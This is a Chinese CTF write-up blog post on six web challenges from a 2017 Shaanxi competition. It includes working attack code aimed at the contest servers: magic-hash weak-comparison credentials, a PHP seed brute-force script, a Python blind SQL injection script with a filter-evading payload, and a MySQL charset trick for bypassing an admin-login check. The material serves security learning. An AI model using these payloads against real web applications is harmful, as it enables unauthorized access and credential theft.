---
title: 2017 陕西省网络安全技术比赛 Writeup
tags: [write-up]
date: 2017-04-17 22:27
---
这次比赛觉得质量挺高的，至少找到了很多盲点，要学习的东西还非常多。0x01 签到题首先看源码  常见的类型，可以见以前写的博客 直接弱类型比较 Username=QNKCDZO&password=240610708 接着继续看源码 直接生成一个json格式的东西发过去就ok 试了好多遍才找到key=0 {‘key’:0} 0x02 抽抽奖一道简单的js调试题目 首先找点击触发事件
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><p>这次比赛觉得质量挺高的，至少找到了很多盲点，要学习的东西还非常多。</p>
<h1 id="0x01-签到题">0x01 签到题</h1>
<p>首先看源码 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417142529527?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
常见的类型，<a href="http://blog.csdn.net/qq_31481187/article/details/60968595">可以见以前写的博客</a> <br>
直接弱类型比较 <br>
Username=QNKCDZO&amp;password=240610708 <br>
接着继续看源码 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417143303468?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></br></br></img></br></p>
<p>直接生成一个json格式的东西发过去就ok 试了好多遍才找到key=0 <br>
{‘key’:0} <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417143502466?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></p>
<h1 id="0x02-抽抽奖">0x02 抽抽奖</h1>
<p>一道简单的js调试题目 <br>
首先找点击触发事件 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417143941082?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></p>
<p>找到之后下断点，点击按钮，单步调试 <br>
在有弹窗的函数出下断点步入 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417144144660?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417144153929?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417144201191?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></img></br></img></br></br></p>
<h1 id="0x03-wrong">0x03 Wrong</h1>
<p>一个备份文件泄露的题目，找到备份文件.index.php.swp <br>
利用<code>vim -r index.php.swp</code>还原</br></p>
<pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span>

error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_password</span><span class="hljs-params">(<span class="hljs-variable">$pw_length</span> =  <span class="hljs-number">10</span>)</span>
{</span>
<span class="hljs-variable">$randpwd</span> = <span class="hljs-string">""</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$pw_length</span>; <span class="hljs-variable">$i</span>++)
{
<span class="hljs-variable">$randpwd</span> .= chr(mt_rand(<span class="hljs-number">33</span>, <span class="hljs-number">126</span>));
}
<span class="hljs-keyword">return</span> <span class="hljs-variable">$randpwd</span>;
}

session_start();
mt_srand(time());
<span class="hljs-variable">$pwd</span>=create_password();

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$pwd</span>==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pwd'</span>])
{
  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'userLogin'</span>]==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'login'</span>])
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Good job, you get the key"</span>;
}
<span class="hljs-keyword">else</span>
{<span class="hljs-keyword">echo</span> <span class="hljs-string">"Wrong!"</span>;}

<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'userLogin'</span>]=create_password(<span class="hljs-number">32</span>).rand();
<span class="hljs-preprocessor">?&gt;</span></span></code></pre>
<p>考点很清楚 爆破种子，<a href="http://wonderkun.cc/index.html/?p=585">以前有类似的题目，附上链接</a> <br>
分析一下逻辑可以得到，第一个随机数mt_srand可以用时间种子暴力破解 <br>
第二个rand可以利用弱类型比较绕过 <br>
左后附上代码</br></br></br></p>
<pre class="prettyprint"><code class="language-php hljs "><span class="hljs-preprocessor">&lt;?php</span> 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_password</span><span class="hljs-params">(<span class="hljs-variable">$pw_length</span> =  <span class="hljs-number">10</span>)</span>
{</span>
<span class="hljs-variable">$randpwd</span> = <span class="hljs-string">""</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$pw_length</span>; <span class="hljs-variable">$i</span>++)
{
<span class="hljs-variable">$randpwd</span> .= chr(mt_rand(<span class="hljs-number">33</span>, <span class="hljs-number">126</span>));
}
<span class="hljs-keyword">return</span> <span class="hljs-variable">$randpwd</span>;
}

<span class="hljs-comment">//$cookie_file = dirname(__FILE__).'/cookie.txt';</span>
<span class="hljs-comment">//使用上面保存的cookies再次访问</span>
<span class="hljs-variable">$i</span> = <span class="hljs-number">80</span>;
<span class="hljs-variable">$time</span> = time();
<span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span>--)
{
mt_srand(<span class="hljs-variable">$time</span>+<span class="hljs-variable">$i</span>);
<span class="hljs-keyword">echo</span>  time();
<span class="hljs-keyword">echo</span> <span class="hljs-string">'hhh'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$time</span>+<span class="hljs-variable">$i</span>;
<span class="hljs-variable">$s</span> = create_password();
<span class="hljs-variable">$url</span> = <span class="hljs-string">"http://117.34.111.15:85/index.php?pwd=$s&amp;login="</span>;
<span class="hljs-variable">$ch</span> = curl_init(<span class="hljs-variable">$url</span>);
curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-keyword">true</span>);
<span class="hljs-comment">//curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file); //使用上面获取的cookies</span>
<span class="hljs-comment">//curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie_file); //存储cookies</span>
<span class="hljs-variable">$response</span> = curl_exec(<span class="hljs-variable">$ch</span>);
curl_close(<span class="hljs-variable">$ch</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$response</span>;
}
<span class="hljs-preprocessor">?&gt;</span></code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417165232031?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h1 id="0x04-so-easy">0x04 so easy!</h1>
<p>这道题挺不错的，学到了很多新姿势 <br>
首先看源码</br></p>
<pre class="prettyprint"><code class=" hljs xml"> <span class="php"><span class="hljs-preprocessor">&lt;?php</span> 

<span class="hljs-keyword">include</span>(<span class="hljs-string">"config.php"</span>);

<span class="hljs-variable">$conn</span> -&gt;query(<span class="hljs-string">"set names utf8"</span>);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randStr</span><span class="hljs-params">(<span class="hljs-variable">$lenth</span>=<span class="hljs-number">32</span>)</span>{</span>
    <span class="hljs-variable">$strBase</span> = <span class="hljs-string">"1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"</span>;
    <span class="hljs-variable">$str</span> = <span class="hljs-string">""</span>;
    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$lenth</span>&gt;<span class="hljs-number">0</span>){
      <span class="hljs-variable">$str</span>.=substr(<span class="hljs-variable">$strBase</span>,rand(<span class="hljs-number">0</span>,strlen(<span class="hljs-variable">$strBase</span>)-<span class="hljs-number">1</span>),<span class="hljs-number">1</span>);
      <span class="hljs-variable">$lenth</span> --;
    }
   <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;
}

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$install</span>){
    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"create table `user` (
         `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,
         `username` varchar(30) NOT NULL,
         `passwd` varchar(32) NOT NULL,
         `role` varchar(30) NOT NULL
       )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci "</span>;
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>)){
       <span class="hljs-variable">$sql</span>  = <span class="hljs-string">"insert into `user`(`username`,`passwd`,`role`) values ('admin','"</span>.md5(randStr()).<span class="hljs-string">"','admin')"</span>;
       <span class="hljs-variable">$conn</span> -&gt; query(<span class="hljs-variable">$sql</span>);
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">(<span class="hljs-variable">$str</span>)</span>{</span>
     <span class="hljs-variable">$filter</span> = <span class="hljs-string">"/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|"</span>.urldecode(<span class="hljs-string">'%09'</span>).<span class="hljs-string">"|"</span>.urldecode(<span class="hljs-string">"%0a"</span>).<span class="hljs-string">"|"</span>.urldecode(<span class="hljs-string">"%0b"</span>).<span class="hljs-string">"|"</span>.urldecode(<span class="hljs-string">'%0c'</span>).<span class="hljs-string">"|"</span>.urldecode(<span class="hljs-string">'%0d'</span>).<span class="hljs-string">"|"</span>.urldecode(<span class="hljs-string">'%a0'</span>).<span class="hljs-string">"/i"</span>; 
     <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$str</span>)){
         <span class="hljs-keyword">die</span>(<span class="hljs-string">"you can't input this illegal char!"</span>);
     }
     <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>; 

}


<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-variable">$username</span>)</span>{</span>
  <span class="hljs-keyword">global</span> <span class="hljs-variable">$conn</span>;
  <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select role from `user` where username ='"</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">"'"</span>;
  <span class="hljs-variable">$res</span> = <span class="hljs-variable">$conn</span> -&gt;query(<span class="hljs-variable">$sql</span>);
  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>){

      <span class="hljs-keyword">echo</span> <span class="hljs-string">"$username is "</span>.<span class="hljs-variable">$res</span>-&gt;fetch_assoc()[<span class="hljs-string">'role'</span>];
  }<span class="hljs-keyword">else</span>{
      <span class="hljs-keyword">die</span>(<span class="hljs-string">"Don't have this user!"</span>);
  }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$passwd</span>)</span>{</span>
    <span class="hljs-keyword">global</span> <span class="hljs-variable">$conn</span>;
    <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;

    <span class="hljs-variable">$username</span> = trim(strtolower(<span class="hljs-variable">$username</span>));
    <span class="hljs-variable">$passwd</span> = trim(strtolower(<span class="hljs-variable">$passwd</span>));
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-string">'admin'</span>){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"you can't login this as admin!"</span>);
    }

    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from `user` where username='"</span>.<span class="hljs-variable">$conn</span>-&gt;escape_string(<span class="hljs-variable">$username</span>).<span class="hljs-string">"' and passwd='"</span>.<span class="hljs-variable">$conn</span>-&gt;escape_string(<span class="hljs-variable">$passwd</span>).<span class="hljs-string">"'"</span>;
    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$conn</span> -&gt;query(<span class="hljs-variable">$sql</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>-&gt;fetch_assoc()[<span class="hljs-string">'role'</span>] === <span class="hljs-string">'admin'</span>) <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$flag</span>);
    }<span class="hljs-keyword">else</span>{
       <span class="hljs-keyword">echo</span> <span class="hljs-string">"sorry,username or passwd error!"</span>;  
    }

}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">source</span><span class="hljs-params">()</span>{</span>

    highlight_file(<span class="hljs-keyword">__FILE__</span>);
}

<span class="hljs-variable">$username</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>])?filter(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>]):<span class="hljs-string">""</span>;
<span class="hljs-variable">$passwd</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>])?filter(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>]):<span class="hljs-string">""</span>;

<span class="hljs-variable">$action</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'action'</span>])?filter(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'action'</span>]):<span class="hljs-string">"source"</span>;

<span class="hljs-keyword">switch</span>(<span class="hljs-variable">$action</span>){
   <span class="hljs-keyword">case</span> <span class="hljs-string">"source"</span>: source(); <span class="hljs-keyword">break</span> ;
   <span class="hljs-keyword">case</span> <span class="hljs-string">"login"</span> : login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$passwd</span>);<span class="hljs-keyword">break</span>;
   <span class="hljs-keyword">case</span> <span class="hljs-string">"show"</span> : show(<span class="hljs-variable">$username</span>);<span class="hljs-keyword">break</span>;
}
</span></code></pre>
<p>需要注意以下几点 <br>
1.数据库不会内容变 <br>
2.show函数可以注入能用的字符串有select from () substr ’ <br>
3.show 可以盲注</br></br></br></p>
<p>盲注姿势 <br>
1.绕过，利用<code>substr(user())from(1)</code> <br>
2.绕过空格 利用（） <br>
3.闭合引号，因为没有注释符所以只能用连等式 <br>
4.连接符选择 使用/连接</br></br></br></br></p>
<p>首先找到盲注点 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417170034684?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
写盲注脚本</br></img></br></p>
<pre class="prettyprint"><code class=" hljs livecodeserver">import requests
<span class="hljs-keyword">string</span> = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-operator">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">126</span>):
        url=<span class="hljs-string">"http://117.34.111.15:89/?action=show"</span>
        s1 = <span class="hljs-string">"admin'/1=(ascii(substr((select(passwd)from(user))from({})))={})/'1'='1"</span>.<span class="hljs-built_in">format</span>(str(i),j)
        data = {
            <span class="hljs-string">'username'</span>:s1
        }
        s=requests.<span class="hljs-built_in">post</span>(url=url,data=data)
        content=s.content
        <span class="hljs-built_in">length</span>=<span class="hljs-built_in">len</span>(content)
        print <span class="hljs-built_in">length</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">length</span> != <span class="hljs-number">21</span>:
            <span class="hljs-keyword">string</span>+=chr(j)
            break
    print <span class="hljs-keyword">string</span> 
</code></pre>
<p>password=37b1d2f04f594bfffc826fd69e389688 <br>
下一步用password登录admin，但发现</br></p>
<pre class="prettyprint"><code class=" hljs lasso"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> <span class="hljs-subst">==</span> <span class="hljs-string">'admin'</span>){
        die(<span class="hljs-string">"you can't login this as admin!"</span>);
    }

    <span class="hljs-variable">$sql</span> <span class="hljs-subst">=</span> <span class="hljs-string">"select * from `user` where username='"</span><span class="hljs-built_in">.</span><span class="hljs-variable">$conn</span><span class="hljs-subst">-&gt;</span>escape_string(<span class="hljs-variable">$username</span>)<span class="hljs-built_in">.</span><span class="hljs-string">"' and passwd='"</span><span class="hljs-built_in">.</span><span class="hljs-variable">$conn</span><span class="hljs-subst">-&gt;</span>escape_string(<span class="hljs-variable">$passwd</span>)<span class="hljs-built_in">.</span><span class="hljs-string">"'"</span>;</code></pre>
<p>发现不能直接用admin登录 <br>
必须利用字符集特征绕过此判断 <br>
<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">P牛的文章</a> <br>
就是admin%c2 在php中就不为admin，但在mysql查询的就是为admin，所以可以绕过 <br>
原因就是Mysql字段的字符集和php mysqli客户端设置的字符集不相同。Mysql在转换字符集的时候，将不完整的字符给忽略了。 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170417170940407?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></br></br></p>
<h1 id="0x05-继续抽">0x05 继续抽</h1>
<p>这道题和第一个抽抽奖相比质量高得多。 <br>
首先经过调试发现运行机制</br></p>
<pre class="prettyprint"><code class=" hljs javascript">$(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>{</span>
    <span class="hljs-keyword">var</span> rotateFunc=<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(jsctf0,jsctf1,jsctf2)</span>{</span>
    $(<span class="hljs-string">'#lotteryBtn'</span>).stopRotate();
    $(<span class="hljs-string">"#lotteryBtn"</span>).rotate({angle:<span class="hljs-number">0x0</span>,duration:<span class="hljs-number">0x1388</span>,animateTo:jsctf1+<span class="hljs-number">0x5a0</span>,callback:<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>{</span>
        $.get(<span class="hljs-string">'get.php?token='</span>+$(<span class="hljs-string">"#token"</span>).val()+<span class="hljs-string">"&amp;id="</span>+encode(md5(jsctf2)),<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(jsctf3)</span>{</span>alert(jsctf3[<span class="hljs-string">'text'</span>])},<span class="hljs-string">'json'</span>);
    $.get(<span class="hljs-string">'token.php'</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(jsctf3)</span>{</span>$(<span class="hljs-string">"#token"</span>).val(jsctf3)},<span class="hljs-string">'json'</span>)
}})};
    $(<span class="hljs-string">"#lotteryBtn"</span>).rotate({bind:{click:<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>{</span>
        <span class="hljs-keyword">var</span> jsctf0=[<span class="hljs-number">0x0</span>];
        jsctf0=jsctf0[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random()*jsctf0.length)];
        <span class="hljs-keyword">if</span>(jsctf0==<span class="hljs-number">0x1</span>){rotateFunc(<span class="hljs-number">0x1</span>,<span class="hljs-number">157</span>,<span class="hljs-string">'1'</span>)};
        <span class="hljs-keyword">if</span>(jsctf0==<span class="hljs-number">0x2</span>){rotateFunc(<span class="hljs-number">0x2</span>,<span class="hljs-number">0xf7</span>,<span class="hljs-string">'2'</span>)};
        <span class="hljs-keyword">if</span>(jsctf0==<span class="hljs-number">0x3</span>){rotateFunc(<span class="hljs-number">0x3</span>,<span class="hljs-number">0x16</span>,<span class="hljs-string">'3'</span>)};
        <span class="hljs-keyword">if</span>(jsctf0==<span class="hljs-number">0x0</span>){<span class="hljs-keyword">var</span> jsctf1=[<span class="hljs-number">0x43</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0xca</span>,<span class="hljs-number">0x124</span>,<span class="hljs-number">0x151</span>];
            jsctf1=jsctf1[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random()*jsctf1.length)];
        rotateFunc(<span class="hljs-number">0x0</span>,jsctf1,<span class="hljs-string">'0'</span>)}}}})})</code></pre>
<p>jsctf 分别为0,1,2,3对应无，一等，二等，三等 <br>
重点在这里<code>$.get('get.php?token='+$("#token").val()+"&amp;id="+encode(md5(jsctf2))</code> <br>
token是本页面里的，下次发送数据需要使用，encode函数我们可通过调试得到</br></br></p>
<pre class="prettyprint"><code class=" hljs cs">
function encode(<span class="hljs-keyword">string</span>)
{
    <span class="hljs-keyword">var</span> output=<span class="hljs-string">''</span>;
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> x=<span class="hljs-number">0</span>,y=<span class="hljs-keyword">string</span>.length,charCode,hexCode;x&lt;y;++x)
        {
            charCode=<span class="hljs-keyword">string</span>.charCodeAt(x);
            <span class="hljs-keyword">if</span>(<span class="hljs-number">128</span>&gt;charCode){charCode+=<span class="hljs-number">128</span>}
                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">127</span>&lt;charCode){charCode-=<span class="hljs-number">128</span>}
                charCode=<span class="hljs-number">255</span>-charCode;
                hexCode=charCode.toString(<span class="hljs-number">16</span>);
                <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>&gt;hexCode.length){hexCode=<span class="hljs-string">'0'</span>+hexCode}
                    output+=hexCode}
    <span class="hljs-keyword">return</span> output
}</code></pre>
<p>下面就用python暴力跑一下</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(str)</span>:</span>
    <span class="hljs-keyword">import</span> hashlib
    m = hashlib.md5()
    m.update(str)
    <span class="hljs-keyword">return</span> m.hexdigest()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span><span class="hljs-params">(string)</span>:</span>
    output=<span class="hljs-string">''</span>;
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:
        charCode = ord(i)
        <span class="hljs-keyword">if</span> <span class="hljs-number">128</span> &gt; charCode:
            charCode+=<span class="hljs-number">128</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-number">127</span>&lt; charCode:
            charCode-=<span class="hljs-number">128</span>
        charCode=<span class="hljs-number">255</span>-charCode;
        hexCode=hex(charCode)[<span class="hljs-number">2</span>:]
        <span class="hljs-keyword">if</span> <span class="hljs-number">2</span> &gt; len(hexCode):
            hexCode=<span class="hljs-string">'0'</span>+hexCode
        output+=hexCode
    <span class="hljs-keyword">return</span> output

r = requests.session()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1000</span>):
    s = r.get(<span class="hljs-string">'http://117.34.111.15:81/'</span>)
    soup = BeautifulSoup(s.content,<span class="hljs-string">'lxml'</span>)
    token = soup.input[<span class="hljs-string">'value'</span>]
    idt = encode(md5(str(i)))
    s1 = r.get(<span class="hljs-string">'http://117.34.111.15:81/get.php?token='</span>+token+<span class="hljs-string">'&amp;id='</span>+idt)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'flag{'</span> <span class="hljs-keyword">in</span> json.loads(s1.content)[<span class="hljs-string">'text'</span>]:
        <span class="hljs-keyword">print</span> json.loads(s1.content)[<span class="hljs-string">'text'</span>]
        <span class="hljs-keyword">break</span>
</code></pre>
<h1 id="0x06-just-a-test">0x06 just a test</h1>
<p>直接AVWS扫描 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170424182028844?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
再接着用sqlmap跑一下 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170424203734920?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170424203746561?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170424204147957?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
发现并没有想要的字段 <br>
可以报错注入 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170424205122533?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
这题想死的心都有了，浪费了好长时间 <br>
flag{99cd1872c9b26525a8e5ec878d230caf}</br></br></img></br></br></br></img></br></img></br></img></br></br></img></br></p></div>